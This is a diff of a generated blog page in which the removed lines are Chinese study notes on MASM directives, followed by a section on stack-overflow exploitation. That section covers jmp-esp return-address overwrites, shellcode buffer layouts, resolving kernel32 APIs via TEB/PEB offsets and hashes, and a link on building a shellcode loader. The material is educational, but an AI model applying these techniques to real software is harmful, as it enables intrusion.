-<p>ALIGN 对齐 (1,2,4)  按照n个字节的边界值对齐</p>
-<p>EVEN  使下一地址从偶数地址开始</p>
-<h2 id="6-TYPEDEF和TYPEDEF-PTR操作符"><a href="#6-TYPEDEF和TYPEDEF-PTR操作符" class="headerlink" title="6.TYPEDEF和TYPEDEF PTR操作符"></a>6.TYPEDEF和TYPEDEF PTR操作符</h2><p>类型自命名和定义指针的类型，<strong>不占用存储空间</strong></p>
-<h2 id="7-LABEL伪指令"><a href="#7-LABEL伪指令" class="headerlink" title="7.LABEL伪指令"></a>7.LABEL伪指令</h2><p>别名，<strong>不占用存储空间</strong></p>
-<h2 id="8-基数控制伪指令RAIDX"><a href="#8-基数控制伪指令RAIDX" class="headerlink" title="8.基数控制伪指令RAIDX"></a>8.基数控制伪指令RAIDX</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.RADIX  16;默认该指令后面的数据都是16进制数，其他进制的数据需要额外说明</span><br><span class="line"></span><br><span class="line">MOV AX,0FF ;十六进制数,对应十进制255</span><br><span class="line">MOV BX ,12D ;十进制数12</span><br></pre></td></tr></table></figure>
-<p>9.ORG伪指令</p>
-<p>10.REPT伪指令</p>
-<h2 id="11-ASSUME伪指令"><a href="#11-ASSUME伪指令" class="headerlink" title="11.ASSUME伪指令"></a>11.ASSUME伪指令</h2><p>将程序的段与逻辑段绑定。</p>
-<h2 id="12-SHORT伪指令"><a href="#12-SHORT伪指令" class="headerlink" title="12.SHORT伪指令"></a>12.SHORT伪指令</h2><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.while(条件)</span><br><span class="line">.endw</span><br><span class="line"></span><br><span class="line">.repeat</span><br><span class="line"></span><br><span class="line">until(条件)</span><br><span class="line"></span><br><span class="line">.if </span><br><span class="line">.elseif</span><br><span class="line">.endif</span><br><span class="line">.break .if ;退出循环</span><br><span class="line">.continue ;结束本次循环，进入下一次循环</span><br></pre></td></tr></table></figure>
-<h2 id="14-结构体和共用体"><a href="#14-结构体和共用体" class="headerlink" title="14.结构体和共用体"></a>14.结构体和共用体</h2><h2 id="15-宏定义"><a href="#15-宏定义" class="headerlink" title="15.宏定义"></a>15.宏定义</h2><h2 id="16-过程"><a href="#16-过程" class="headerlink" title="16.过程"></a>16.过程</h2><p>模块化代码</p>
-<p>PROC [NEAR] 或者[FAR]，默认近调用，即在ODS实模式下的一个段里(&lt;64KB(。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">主程序中 CALL &#123;PROC_noarg_name&#125;</span><br><span class="line"></span><br><span class="line">PUSH 参数2</span><br><span class="line">PUSH 参数1</span><br><span class="line">INVOKE &#123;PROC_noarg_name&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;PROC_noarg_name&#125; PROC [NEAR]</span><br><span class="line">	LOCAL 变量名1[重复数量]:类型,变量名2[重复数量]:类型</span><br><span class="line">	RET   ;从栈中弹出返回地址，返回到主程序</span><br><span class="line">&#123;PROC_noarg_name&#125; ENDP	</span><br><span class="line"></span><br><span class="line">&#123;PROC_name&#125; PROC,参数1:类型,参数2:类型,...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="17-ENTER和LEAVE"><a href="#17-ENTER和LEAVE" class="headerlink" title="17.ENTER和LEAVE"></a>17.ENTER和LEAVE</h2><h2 id="18-RET和RETN"><a href="#18-RET和RETN" class="headerlink" title="18.RET和RETN"></a>18.RET和RETN</h2><h2 id="19-IDA的反汇编"><a href="#19-IDA的反汇编" class="headerlink" title="19.IDA的反汇编"></a>19.IDA的反汇编</h2><h2 id="0day-安全"><a href="#0day-安全" class="headerlink" title="0day 安全"></a>0day 安全</h2><p> 文件偏移地址 = 虚拟内存地址（VA）−装载基址（Image Base）−节偏移<br>= RVA -节偏移 </p>
-<p>对于 栈桢可能发生移位的情况 </p>
-<h2 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h2><p> 一个函数返回时，esp正好指向原来存储返回地址的下一位，我们将shellcode从ret_addr的后一个位置开始填充，并将ret_addr填充为一个进程中的”jmp esp”的指令的地址，这样函数返回后就会跳到esp指向的栈顶的位置开始执行shellcode。 </p>
-<p>缓冲区组成方式，现阶段已经讲了两种：</p>
-<ol>
-<li>将shellcode放到缓冲区，然后覆盖返回地址到缓冲区的起始地址。这种适用于缓冲区较大的场合。</li>
-<li><p>将shellcode放到函数返回地址以后，然后覆盖返回地址为”jmp esp”之类的指令，使得函数返回时跳转到shellcode处执行指令。这种适用于缓冲区较小的场合。</p>
-</li>
-<li><p>找到程序运行的线程环境块TEB。</p>
-</li>
-<li>TEB的起始地址偏移0x30的地方指向进程环境块PEB。</li>
-<li>PEB的地址偏移0x0C的地方存放指向PEB_LDR_DATA结构体的指针，该指针指向一个存放着被进程装载的动态链接库的信息的结构体。</li>
-<li>PEB_LDR_DATA结构体偏移位置位0x1C的地方指向模块初始化链表的头指针InInitializationOrderModuleList。</li>
-<li>4中的链表存放PE被载入时初始化的模块信息，第一个链表节点时ntdll.dll，第二个位kernel32.dll。</li>
-<li>kernel32.dll的节点偏移0x08是kernel32.dll在内存中载入的基址。</li>
-<li>kernel32.dll的基址加0xe3C是PE头的地址。</li>
-<li>PE头偏移0x78存放着指向函数导出表的指针。</li>
-<li>安照下述方法寻址：<ul>
-<li>导出表偏移0x1C的指针指向存储导出函数偏移地址（RVA）的列表。</li>
-<li>导出表偏移0x20指针指向存储导出函数名的列表。</li>
-<li>根据函数名找到我们要的函数是导出表中的第几个，然后再地址列表中找到对应RVA。</li>
-<li>RVA加上动态链接库的基址即是VA，这个也是我们在shellcode中需要的地址。</li>
-</ul>
-</li>
-</ol>
-<p>这里shellcode的构造为了尽可能的短，所以需要给每个API名字用一个hash去代替。<br>MessageBoxA：0x1e380a6a<br>ExitProcess：0x4fd18963<br>LoadLibraryA：0x0c917432</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push 0x1e380a6a</span><br><span class="line">push 0x4fd18963 </span><br><span class="line">push 0x0c917432</span><br><span class="line">mov esi,esp</span><br><span class="line">lea edi,[esi-0xC]</span><br></pre></td></tr></table></figure>
-<h2 id="如何实现一款-shellcodeLoader"><a href="#如何实现一款-shellcodeLoader" class="headerlink" title="如何实现一款 shellcodeLoader"></a>如何实现一款 shellcodeLoader</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1755926">https://cloud.tencent.com/developer/article/1755926</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1360,7 +1251,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">147</span>
+          <span class="site-state-item-count">150</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
